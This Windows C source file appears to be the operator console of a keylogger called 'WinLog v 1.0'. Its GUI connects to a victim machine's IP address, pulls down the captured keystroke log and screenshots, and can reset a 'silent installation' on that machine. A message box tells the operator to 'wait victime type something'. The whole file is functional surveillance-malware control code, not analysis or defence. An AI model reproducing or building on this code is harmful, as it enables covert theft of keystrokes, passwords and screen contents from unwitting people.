#include <windows.h>
#include <stdio.h>
#include <errno.h>
#include <assert.h>
#include <time.h>   // time(), localtime(), struct tm
#include <ctype.h>    // tolower()

#include <winsock2.h>
#include <commctrl.h>

#include "../includes/constants.h"
#include "../includes/utils.h"

HINSTANCE hInstance;
HHOOK hKbHook = NULL;

HWND hServerIP = NULL;
TCHAR IP_buffer[16] = "";

HWND hProgress_bar = NULL;

int APIENTRY WinMain(HINSTANCE cetteInstance, HINSTANCE precedenteInstance, LPSTR lignesDeCommande, int modeAffichage)
{
    HWND main_window;
    MSG msg;
    WNDCLASS win_class;

    hInstance = cetteInstance;

    win_class.style = CS_HREDRAW | CS_VREDRAW;
    win_class.lpfnWndProc = mainWindowProc;
    win_class.cbClsExtra = 0;
    win_class.cbWndExtra = 0;
    win_class.hInstance = NULL;
    win_class.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    win_class.hCursor = LoadCursor(NULL, IDC_ARROW);
    win_class.hbrBackground = (HBRUSH) (CreateSolidBrush(RGB(20, 60, 80)));
    win_class.lpszMenuName = NULL;
    win_class.lpszClassName = "classF";

    if(!RegisterClass(&win_class))
        return FALSE;

    main_window = CreateWindow("classF", "WinLog v 1.0", WS_POPUP,
                                CW_USEDEFAULT, CW_USEDEFAULT, 500, 230, NULL, NULL, cetteInstance, NULL);
    if(!main_window)
        return FALSE;

    ShowWindow(main_window, modeAffichage);
    UpdateWindow(main_window);

    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKbHook);

    return (int)msg.wParam;
}

void DrawCloseButton(HDC hdc)
{
    if(isMouseDownOnCloseButton)
    {
        RECT rc;
        rc.left = 0;
        rc.top = 0;
        rc.right = 30;
        rc.bottom = 30;
        HBRUSH br = CreateSolidBrush(RGB(200, 30, 30));
        FillRect(hdc, &rc, br);

        SetBkColor(hdc, RGB(200, 30, 30));
        SetTextColor(hdc, RGB(255, 255, 255));

        TextOut(hdc, 10, 8, (LPCSTR)L"X", 1);
    }

    else
    {
        RECT rc;
        rc.left = 0;
        rc.top = 0;
        rc.right = 30;
        rc.bottom = 30;
        HBRUSH br = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rc, br);

        SetBkColor(hdc, RGB(0, 0, 0));
        SetTextColor(hdc, RGB(255, 255, 255));

        TextOut(hdc, 10, 8, (LPCSTR)L"X", 1);
    }
}

void DrawMinimizeButton(HDC hdc)
{
    if(isMouseDownOnMinimizeButton)
    {
        RECT rc;
        rc.left = 0;
        rc.top = 0;
        rc.right = 30;
        rc.bottom = 30;
        HBRUSH br = CreateSolidBrush(RGB(60, 60, 100));
        FillRect(hdc, &rc, br);

        SetBkColor(hdc, RGB(60, 60, 100));
        SetTextColor(hdc, RGB(255, 255, 255));
        TextOut(hdc, 10, 5, (LPCSTR)L"_", 1);
    }

    else
    {
        RECT rc;
        rc.left = 0;
        rc.top = 0;
        rc.right = 30;
        rc.bottom = 30;
        HBRUSH br = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rc, br);

        SetBkColor(hdc, RGB(0, 0, 0));
        SetTextColor(hdc, RGB(255, 255, 255));
        TextOut(hdc, 10, 5, (LPCSTR)L"_", 1);
    }
}

void Draw_LeftRightBottom_Rectangles(RECT rect, HDC hdc, HBRUSH brush, int width, int height)
{
    RECT leftrect, rightrect, bottomrect;
    leftrect.left = 0;
    leftrect.top = rect.bottom - 266;
    leftrect.right = 4;
    leftrect.bottom = height;

    FillRect(hdc, &leftrect, brush);

    rightrect.left = width - 4;
    rightrect.top = rect.bottom - 266;
    rightrect.right = width;
    rightrect.bottom = height;

    FillRect(hdc, &rightrect, brush);

    bottomrect.left = 0;
    bottomrect.top = height - 4;
    bottomrect.right = width;
    bottomrect.bottom = height;

    FillRect(hdc, &bottomrect, brush);
}


LRESULT CALLBACK mainWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HDC hdc;
    PAINTSTRUCT ps;
    HICON hIcon;

    LPDRAWITEMSTRUCT pdis;
    LRESULT move = NULL;

    int ret = 0;
    static int X = 0;
    static int Y = 0;

    size_t flag = 0;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    long weight = 0;
    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;
    int empty_log = 0;

    char buffer[MAXDATASIZE] = "";

    FILE *download_log_file = NULL;

    long step_foreward = 0.;

    switch(msg)
    {
        case WM_CREATE :

            FillWindow(hwnd);
            return 0;

        case WM_PAINT:

            hdc = BeginPaint(hwnd, &ps);

            RECT rect;
            HBRUSH brush;

            GetClientRect(hwnd, &rect);
            rect.bottom = rect.bottom - 200;
            brush = CreateSolidBrush(RGB(0, 0, 0));

            FillRect(hdc, &rect, brush);

            Draw_LeftRightBottom_Rectangles(rect, hdc, brush, X, Y);

            SetBkColor(hdc, RGB(0, 0, 0));
            SetTextColor(hdc, RGB(120, 127, 200));
            TextOut(hdc, 15, 5, TEXT("WinLog v 1.0"), 13);

            hIcon = (HICON)LoadIcon(hInstance, IDI_APPLICATION);
            DrawIconEx(hdc, 5, 5, hIcon, 20, 20, 0, brush, 0);

            EndPaint(hwnd, &ps);

            return 0;

        case WM_DRAWITEM:
            pdis = (LPDRAWITEMSTRUCT)lParam;

            switch (pdis->CtlID)
            {
                case ID_CLOSE:
                    DrawCloseButton(pdis->hDC);
                    break;

                case ID_MINIMIZE:
                    DrawMinimizeButton(pdis->hDC);
                    break;
            }

            //if button is selected then change values
            if (pdis->itemState && ODS_SELECTED)
            {
                isMouseDownOnCloseButton = TRUE;
                isMouseDownOnMinimizeButton = TRUE;
            }
            else
            {
                isMouseDownOnCloseButton = FALSE;
                isMouseDownOnMinimizeButton = FALSE;
            }

            return 0;

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;

        case WM_COMMAND:

            switch(LOWORD(wParam))
            {
                case ID_CLOSE:
                    PostQuitMessage(EXIT_SUCCESS);
                    return 0;

                case ID_MINIMIZE:
                    SendMessage(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, lParam);
                    return 0;

                case ID_B_IMPORTLOG :
                {
                    flag = 1;

                    WSADATA WSAData;
                    int erreur = WSAStartup(MAKEWORD(2,2), &WSAData);

                    if(!erreur)
                    {
                        sock = socket(AF_INET, SOCK_STREAM, 0);

                        sin.sin_addr.s_addr = inet_addr(IP_buffer);
                        sin.sin_family = AF_INET;
                        sin.sin_port = htons(PORT);

                        if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR)
                        {
                            /** Send flag value **/
                            if(send(sock, (char*)&flag, sizeof(flag), 0) != SOCKET_ERROR)
                            {
                                /** Open file wish will recieve the keylogger's log **/
                                download_log_file = fopen("BaseBrd.log", "wb");
                                if(download_log_file == NULL)
                                {
                                    perror("fopen() download_log_file ");
                                    exit(-1);
                                }

                                if(recv(sock, (char*)&empty_log, sizeof(empty_log), 0) == SOCKET_ERROR)
                                {
                                    perror("recv() empty log value failed ");
                                }

                                if(empty_log == 1)
                                {
                                    MessageBox(hwnd, "Log file is empty.\nPlease wait victime type something.", "Log File Empty",
                                               MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_APPLMODAL);

                                    fclose(download_log_file);
                                    closesocket(sock);
                                    WSACleanup();

                                    return 0;
                                }

                                /** Recieve file weigth **/
                                if(recv(sock, (char*)&weight, sizeof(weight), 0) == SOCKET_ERROR)
                                {
                                    perror("recv() weight failed ");
                                }

                                do
                                {
                                    tailleBlockRecut = recv(sock, buffer, weight, 0);

                                    fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, download_log_file);

                                    totalRcv += tailleBlockRecut;

                                }while(totalRcv < weight);

                                printf("File downloaded ...\n");

                                fclose(download_log_file);
                                closesocket(sock);
                                WSACleanup();

                                MessageBox(hwnd, "Log file downloaded.", "Success", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 |
                                            MB_APPLMODAL);

                                //system("python decode_b64.py");
                                //system("del /F BaseBrd_encoded.log");

                            }
                        }

                        else
                        {
                            MessageBox(hwnd, "Server unreachable.Connection failed !", "Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 |
                                                    MB_APPLMODAL);

                            perror("Impossible de se connecter ");

                            return 0;
                        }
                    }
                    return 0;
                }

                case ID_B_SCREENSHOT :
                {
                    FILE *screenshot_file = NULL;
                    //long tailleBlockRecut = 0;
                    //long data_len = 0;
                    //long totalRcv = 0;

                    flag = 2;

                    WSADATA WSAData;
                    int erreur = WSAStartup(MAKEWORD(2,2), &WSAData);

                    if(!erreur)
                    {
                        sock = socket(AF_INET, SOCK_STREAM, 0);

                        sin.sin_addr.s_addr = inet_addr(IP_buffer);
                        sin.sin_family = AF_INET;
                        sin.sin_port = htons(PORT);

                        if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR)
                        {
                            if(send(sock, (char*)&flag, sizeof(flag), 0) != SOCKET_ERROR)
                            {
                                screenshot_file = fopen("screenshot.jpg", "wb");
                                if(screenshot_file == NULL)
                                {
                                    perror("fopen() screenshot file failed ");
                                    exit(-1);
                                }

                                if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
                                {
                                    perror("recv() data_len failed ");
                                    exit(-1);
                                }

                                SendMessage(hProgress_bar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
                                SendMessage(hProgress_bar, PBM_SETSTEP, 1, 0);

                                do
                                {
                                    tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

                                    fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, screenshot_file);

                                    totalRcv += tailleBlockRecut;

                                    step_foreward = (totalRcv * 100) / data_len;

                                    SendMessage(hProgress_bar, PBM_SETPOS, (WPARAM)step_foreward, 0);

                                    //printf("step_foreward = %ld\n", step_foreward);

                                    //printf("-----> %ld octets recieved ... \n", totalRcv);

                                }while(totalRcv < data_len);

                                printf("Reception du screenshot success !!!!\n");

                                fclose(screenshot_file);

                                closesocket(sock);
                                WSACleanup();

                                MessageBox(hwnd, "Screenshot downloaded.", "Success", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 |
                                            MB_APPLMODAL);
                            }
                        }

                        else
                        {
                            MessageBox(hwnd, "Server unreachable.Connection failed !", "Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 |
                                                    MB_APPLMODAL);

                            perror("Impossible de se connecter ");

                            return 0;
                        }
                    }

                    return 0;
                }

                case ID_B_INIT :
                {
                    flag = 3;

                    WSADATA WSAData;
                    int ret_error = WSAStartup(MAKEWORD(2,2), &WSAData);

                    if(!ret_error)
                    {
                        sock = socket(AF_INET, SOCK_STREAM, 0);

                        sin.sin_addr.s_addr = inet_addr(IP_buffer);
                        sin.sin_family = AF_INET;
                        sin.sin_port = htons(PORT);

                        if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR)
                        {
                            printf("Connected ...\n\n");
                        }

                        else
                        {
                            MessageBox(hwnd, "Server unreachable.Connection failed !", "Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 |
                                                    MB_APPLMODAL);

                            perror("Impossible de se connecter ");
                            return 0;
                        }

                        if(send(sock, (char*)&flag, sizeof(char), 0) != SOCKET_ERROR)
                            printf("flag init  = %d\n", flag);

                        closesocket(sock);
                        WSACleanup();

                        MessageBox(hwnd, "Silent installation's process has been re initialized.", "Success", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 |
                                            MB_APPLMODAL);
                    }

                    return 0;
                }

                case ID_B_SETIP :
                {
                    //TCHAR IP_buffer[16] = "";

                    GetWindowText(hServerIP, IP_buffer, 16);

                    printf("IP_buffer ---> %s\n", IP_buffer);

                    return 0;
                }

                case ID_B_QUIT:

                    ret = MessageBox(hwnd, "Are you sure you want to exit the program ?", "Quit", MB_YESNO | MB_ICONWARNING |
                                     MB_DEFBUTTON2 | MB_SYSTEMMODAL | MB_TOPMOST);

                    if(ret == IDYES)
                        SendMessage(hwnd, WM_DESTROY, 0, 0);

                    else
                        break;
            }

        case WM_SIZE:
            X = LOWORD(lParam);
            Y = HIWORD(lParam);
            break;

        case WM_NCHITTEST:
        {
            RECT rc;
            POINT pt;

            GetCursorPos(&pt);

            GetWindowRect(hwnd, &rc);
            rc.bottom = rc.bottom - 50;

            //if cursor position is within top layered drawn rectangle then
            //set move to HTCAPTION for moving the window from its client
            if (pt.x <= rc.right && pt.x >= rc.left && pt.y <= rc.bottom && pt.y >= rc.top)
            {
                move = DefWindowProc(hwnd, msg, wParam, lParam);
                if (move == HTCLIENT)
                {
                    move = HTCAPTION;
                }
            }

            return move;
            break;
        }

        default :
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }

    return EXIT_SUCCESS;
}


VOID FillWindow(HWND main_window)
{
    static HWND button[4] = {NULL};
    HWND minimize_button = NULL;
    HWND close_button = NULL;

    //HWND hServerIP = NULL;
    HWND hSetServerIP = NULL;

    HWND reinit_silent_instalations = NULL;

    //HWND hProgress_bar = NULL;

    int i = 0;

    minimize_button = CreateWindow(TEXT("button"), TEXT(""), WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 439, 0, 30, 30, main_window, (HMENU)ID_MINIMIZE, hInstance, NULL);

    if(!minimize_button)
        return FALSE;

    close_button = CreateWindow(TEXT("button"), TEXT(""), WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 470, 0, 30, 30, main_window, (HMENU)ID_CLOSE, hInstance, NULL);

    if(!close_button)
        return FALSE;

    hProgress_bar = CreateWindowEx(0, PROGRESS_CLASS, NULL, WS_CHILD | WS_VISIBLE | PBS_SMOOTH, 5, 207, 490, 18, main_window, NULL, NULL, NULL);
    if(!hProgress_bar)
        return FALSE;

    button[0] = CreateWindow(TEXT("BUTTON"), TEXT("Take a screenshot"), WS_CHILD | WS_VISIBLE, 20, 95, 150, 30, main_window, (HMENU)ID_B_SCREENSHOT, hInstance, NULL);
    button[1] = CreateWindow(TEXT("BUTTON"), TEXT("Import Log File"), WS_CHILD | WS_VISIBLE, 180, 95, 150, 30, main_window, (HMENU)ID_B_IMPORTLOG, hInstance, NULL);
    button[2] = CreateWindow(TEXT("BUTTON"), TEXT("Init Installations"), WS_CHILD | WS_VISIBLE, 340, 95, 150, 30, main_window, (HMENU)ID_B_INIT, hInstance, NULL);
    button[3] = CreateWindow(TEXT("BUTTON"), TEXT("Quit"), WS_CHILD | WS_VISIBLE, 100, 150, 300, 30, main_window, (HMENU)ID_B_QUIT, hInstance, NULL);

    hServerIP = CreateWindow(TEXT("EDIT"), TEXT("Server IP"), WS_CHILD | WS_VISIBLE | ES_WANTRETURN | SS_CENTER, 130, 50, 95, 20, main_window, (HMENU)ID_SERVER, hInstance, NULL);

    hSetServerIP = CreateWindow(TEXT("BUTTON"), TEXT("SET IP"), WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 50, 100, 20, main_window, (HMENU)ID_B_SETIP, hInstance, NULL);

    //reinit_silent_instalations = CreateWindow(TEXT("BUTTON"), TEXT("Init Installations"), WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 50, 150, 200, 30, main_window, (HMENU)ID_B_INIT, hInstance, NULL);

    if(!hSetServerIP)
        return FALSE;

    if(!reinit_silent_instalations)
        return FALSE;

    for(i = 0; i < 4; i++)
    {
        if(!button[i])

            return FALSE;
    }

    return;

}


